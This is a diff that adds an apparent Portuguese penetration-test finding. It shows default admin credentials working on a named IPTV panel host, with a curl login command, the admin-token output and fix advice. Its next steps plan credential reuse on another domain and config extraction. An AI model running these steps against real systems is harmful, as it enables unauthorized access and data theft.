@@ -1,0 +1,52 @@
+# F-001 Default Credentials → JWT Admin Access
+
+**Alvo:** apsv-iptv.duckdns.org (56.125.111.53 — AWS, sem WAF)
+**Severidade:** Crítica
+**Timestamp:** 2026-08-22T22:00:00Z
+**Tipo:** Default Credentials / Auth Bypass
+
+## Descoberta
+Credenciais padrão `admin:admin123` funcionam no painel de login do app TelaViva IPTV.
+
+## Reprodução
+```bash
+# Login com creds admin
+curl -s -X POST 'https://apsv-iptv.duckdns.org/api/auth/login' \
+  -H 'Content-Type: application/json' \
+  -d '{"email":"admin","password":"admin123"}' \
+  | jq .
+```
+
+## Output
+```json
+{
+  "success": true,
+  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<token>",
+  "refreshToken": "<refresh>",
+  "user": {
+    "id": 1,
+    "name": "Admin",
+    "email": "admin@telaviva.tv",
+    "role": "ADMIN",
+    "maxConnections": 999,
+    "expiresAt": null
+  }
+}
+```
+
+## Impacto
+- **Acesso ADMIN total** ao sistema IPTV
+- Dashboard administrativo completo (canais, VOD, usuários, EPG, pagamentos)
+- Catálogo completo: 487 canais com URLs de stream
+- VOD: filmes/séries com sources
+- Configurações do sistema
+
+## Recomendação
+- Alterar imediatamente a senha padrão `admin:admin123`
+- Implementar MFA (autenticação multifator)
+- Rate limiting mais agressivo no endpoint de login
+
+## Próximo passo
+- Testar reuso das mesmas credenciais em telaviva.com.br (cPanel/WHM/WordPress)
+- Extrair configurações sensíveis via `/api/admin/config`
+- Verificar se há outros usuários com senhas fracas
